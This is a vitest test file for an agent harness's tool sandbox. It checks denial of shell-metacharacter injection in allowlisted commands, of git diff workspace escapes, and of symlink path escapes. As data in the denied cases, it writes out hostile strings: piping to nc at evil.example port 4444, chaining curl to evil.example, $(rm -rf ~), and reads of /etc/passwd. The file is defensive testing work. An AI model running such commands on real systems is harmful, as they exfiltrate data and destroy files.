// Harness tool-surface tests — PR 10 round-1 fixes 1 and 5, plus issue #18:
//   - fix 1 (HIGH): token-prefix command patterns must NOT bless shell
//     metacharacters (the exec shell interprets what the token prefix never
//     saw); anchored re: patterns are the documented escape hatch.
//   - fix 5 (MED): pre-existing symlinks pointing outside the workspace are
//     denied on read/edit (realpath re-check; the TOCTOU window stays
//     documented, not tested — it is not deterministically exercisable).
//   - issue #18: exec's maxBuffer is sized above the output cap so a noisy
//     command returns a TRUNCATED RESULT (capOutput truncates), never the
//     1 MiB default's string-code rejection dressed up as a run failure.
//
// NO EXTERNAL BINARIES (review round 3, finding 1): every ALLOWED case
// actually EXECUTES through /bin/sh, so its command must be shell BUILTINS
// only (echo / printf / exit / true / false). DENIED cases never execute —
// their command strings may name whatever the judgment is about.
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, test } from 'vitest';
import { buildTools } from '../../src/harness/tools.js';
import { defaultHarnessConfig } from '../../src/harness/config.js';
import type { HarnessConfig } from '../../src/harness/config.js';

async function withScratch(body: (scratchDir: string) => Promise<void>): Promise<void> {
  const scratchDir = await mkdtemp(join(tmpdir(), 'harness-tools-'));
  try {
    await body(scratchDir);
  } finally {
    await rm(scratchDir, { recursive: true, force: true });
  }
}

/** Harness config whose run allowlist is exactly `patterns`. */
function runConfig(commandPatterns: string[]) {
  return {
    ...defaultHarnessConfig,
    tools: {
      ...defaultHarnessConfig.tools,
      run: { enabled: true, commandPatterns, timeoutMs: 5_000, maxOutputChars: 10_000 },
    },
  };
}

describe('run allowlist: token patterns vs shell metacharacters (fix 1)', () => {
  test('a legit prefix command is still allowed', async () => {
    await withScratch(async (scratchDir) => {
      // Shell BUILTINS only (echo): an allowed case EXECUTES, so it must
      // spawn nothing external (review round 3, finding 1).
      const run = buildTools(runConfig(['echo pilot']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'echo pilot patrol' });
      expect(result?.ok).toBe(true);
      if (result?.ok) {
        expect(result.output).toContain('pilot patrol'); // the builtin really ran
      }
    });
  });

  test.each([
    'npm test ; whoami',
    'npm test && curl evil.example',
    'npm test $(rm -rf ~)',
    'npm test `whoami`',
    'npm test | nc evil.example 4444',
    'npm test > /tmp/pwned',
    'npm test < /etc/passwd',
    'npm test\nwhoami',
  ])('metacharacter variant denied: %j', async (command) => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.tool).toBe('run');
        expect(result?.denial.reason).toBe(
          'command allowlist: shell metacharacters not permitted with token patterns — use re: with anchoring',
        );
      }
    });
  });

  test('a non-matching command keeps the plain allowlist-miss reason', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'npm run test' });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.reason).toContain('command not allowed by harness config allowlist');
      }
    });
  });

  test('anchored re: patterns remain the deliberate metacharacter escape hatch', async () => {
    await withScratch(async (scratchDir) => {
      // Builtins only — the case EXECUTES (the re: author owns the full
      // metachar-bearing string), so nothing external may spawn.
      const run = buildTools(runConfig(['re:^echo pilot.*$']), scratchDir).find(
        (t) => t.name === 'run',
      );
      const result = await run?.execute({ command: 'echo pilot; exit 0' });
      expect(result?.ok).toBe(true); // the re: author owns the full string
    });
  });

  test('a token-pattern metachar match does not shadow a LATER anchored re: escape hatch', async () => {
    await withScratch(async (scratchDir) => {
      // The token pattern matches the metacharacter-bearing command, but the
      // LATER anchored re: pattern is the escape hatch the denial points at —
      // it must still allow outright, whatever the pattern order. Builtins
      // only (the case EXECUTES); exit 3 proves the command RAN by mapping
      // to ok:true + exitCode 3 — no external binary involved.
      const run = buildTools(
        runConfig(['echo pilot', 're:^echo pilot ; exit 3$']),
        scratchDir,
      ).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'echo pilot ; exit 3' });
      expect(result?.ok).toBe(true);
      if (result?.ok) {
        expect(result.exitCode).toBe(3); // executed for real (nonzero exit is a result, not a denial)
      }
    });
  });

  test('a token-pattern metachar match still denies when no re: pattern allows', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'npm test ; deploy' });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.reason).toBe(
          'command allowlist: shell metacharacters not permitted with token patterns — use re: with anchoring',
        );
      }
    });
  });
});

describe('git diff workspace escape hardening', () => {
  test.each(['git diff --no-index /dev/null /etc/passwd', 'git diff --output=/tmp/cq-escape'])(
    'rejects the escape shape %j even under an anchored allowlist',
    async (command) => {
      await withScratch(async (scratchDir) => {
        const run = buildTools(runConfig([`re:^git diff.*$`]), scratchDir).find(
          (t) => t.name === 'run',
        );
        const result = await run?.execute({ command });
        expect(result?.ok).toBe(false);
        if (result && !result.ok) expect(result.denial.reason).toContain('command not allowed');
      });
    },
  );

  test.each(['git diff', 'git diff -- src', 'git diff --cached -- src'])(
    'keeps the legitimate workspace diff form %j allowed',
    async (command) => {
      await withScratch(async (scratchDir) => {
        const run = buildTools(runConfig(['git diff']), scratchDir).find((t) => t.name === 'run');
        const result = await run?.execute({ command });
        expect(result?.ok).toBe(true);
      });
    },
  );
});

describe('symlink hardening (fix 5)', () => {
  test('a pre-existing symlink pointing outside the workspace is denied on read and edit', async () => {
    await withScratch(async (scratchDir) => {
      const workspace = join(scratchDir, 'ws');
      const outside = join(scratchDir, 'outside');
      await mkdir(workspace, { recursive: true });
      await mkdir(outside, { recursive: true });
      await writeFile(join(outside, 'secret.txt'), 'top secret', 'utf8');
      await symlink(join(outside, 'secret.txt'), join(workspace, 'link.txt'));

      const tools = buildTools(defaultHarnessConfig, workspace);
      const read = tools.find((t) => t.name === 'read');
      const edit = tools.find((t) => t.name === 'edit');

      const readResult = await read?.execute({ path: 'link.txt' });
      expect(readResult?.ok).toBe(false);
      if (!readResult?.ok) {
        expect(readResult?.denial.reason).toContain('path escape');
        expect(readResult?.denial.reason).toContain('symlink');
      }

      const editResult = await edit?.execute({ path: 'link.txt', oldText: 'secret', newText: 'x' });
      expect(editResult?.ok).toBe(false);
      if (!editResult?.ok) {
        expect(editResult?.denial.reason).toContain('path escape');
        expect(editResult?.denial.reason).toContain('symlink');
      }
      // The outside file is untouched.
      await expect(read?.execute({ path: 'link.txt' })).resolves.toMatchObject({ ok: false });
    });
  });

  test('a real file inside the workspace still reads fine (no false positives)', async () => {
    await withScratch(async (scratchDir) => {
      const workspace = join(scratchDir, 'ws');
      await mkdir(workspace, { recursive: true });
      await writeFile(join(workspace, 'real.txt'), 'plain content', 'utf8');
      const read = buildTools(defaultHarnessConfig, workspace).find((t) => t.name === 'read');
      const result = await read?.execute({ path: 'real.txt' });
      expect(result?.ok).toBe(true);
    });
  });

  test('an in-workspace symlink cannot use its lexical name to bless an out-of-pattern target', async () => {
    await withScratch(async (scratchDir) => {
      const workspace = join(scratchDir, 'ws');
      await mkdir(join(workspace, 'src'), { recursive: true });
      await writeFile(join(workspace, 'secret.txt'), 'top secret', 'utf8');
      await writeFile(join(workspace, 'src', 'real.txt'), 'plain content', 'utf8');
      // src/link → ../secret.txt: INSIDE the workspace, OUTSIDE the 'src/**'
      // pattern — the lexical name matches while the I/O would land on
      // 'secret.txt', so the realpath-side allowlist check must deny.
      await symlink(join('..', 'secret.txt'), join(workspace, 'src', 'link'));

      const srcOnly: HarnessConfig = {
        ...defaultHarnessConfig,
        tools: {
          ...defaultHarnessConfig.tools,
          read: { enabled: true, pathPatterns: ['src/**'], maxOutputChars: 10_000 },
          edit: { enabled: true, pathPatterns: ['src/**'], maxOutputChars: 10_000 },
        },
      };
      const tools = buildTools(srcOnly, workspace);
      const read = tools.find((t) => t.name === 'read');
      const edit = tools.find((t) => t.name === 'edit');

      const viaLink = await read?.execute({ path: 'src/link' });
      expect(viaLink?.ok).toBe(false);
      if (!viaLink?.ok) {
        expect(viaLink?.denial.reason).toBe(
          "path not allowed by harness config allowlist: 'src/link'",
        );
      }

      // Same gate on the write side.
      const editViaLink = await edit?.execute({ path: 'src/link', oldText: 'top', newText: 'x' });
      expect(editViaLink?.ok).toBe(false);
      if (!editViaLink?.ok) {
        expect(editViaLink?.denial.reason).toContain(
          'path not allowed by harness config allowlist',
        );
      }

      // The out-of-pattern target stays unreachable by its own name too…
      await expect(read?.execute({ path: 'secret.txt' })).resolves.toMatchObject({ ok: false });
      // …and the real in-pattern file still reads (no false positive).
      await expect(read?.execute({ path: 'src/real.txt' })).resolves.toMatchObject({ ok: true });
    });
  });
});

// ---------------------------------------------------------------------------
// Issue #18 — exec maxBuffer sized above the output cap: capOutput truncates,
// exec's 1 MiB default never turns noisy output into a 'run failed' denial.
// ---------------------------------------------------------------------------

describe('run output: maxBuffer sized above the cap (issue #18)', () => {
  test('a command emitting > 1 MiB returns a truncated RESULT, not a run-failed denial', async () => {
    await withScratch(async (scratchDir) => {
      // cap 600k chars → maxBuffer = 600_000 * 4 + 64KiB ≈ 2.4 MB (bytes vs
      // chars): the ~1.5 MB output fits the buffer — where exec's 1 MiB
      // DEFAULT would reject with a string-code error — and capOutput
      // truncates it. The probe is a PURE-BUILTIN /bin/sh while-loop with
      // printf (review thread: no external binary; timed in-process at
      // ~0.4 s per run, 3× consistent — far under the 2.5 s budget), so the
      // no-external-binaries convention holds with NO exception.
      const capConfig: HarnessConfig = {
        ...defaultHarnessConfig,
        tools: {
          ...defaultHarnessConfig.tools,
          run: {
            enabled: true,
            commandPatterns: ['re:^i=0; while.*cap-probe.*$'],
            timeoutMs: 30_000,
            maxOutputChars: 600_000,
          },
        },
      };
      const run = buildTools(capConfig, scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({
        command: `i=0; while [ $i -lt 11000 ]; do printf 'cap-probe line %05d ${'x'.repeat(110)}\\n' "$i"; i=$((i+1)); done`,
      });
      expect(result?.ok).toBe(true); // the old default made this a denial
      if (result?.ok) {
        expect(result.exitCode).toBe(0);
        expect(result.truncated).toBe(true);
        expect(result.output.length).toBeLessThanOrEqual(600_000);
        expect(result.output).toContain('exit 0');
      }
    });
  }, 30_000);
});
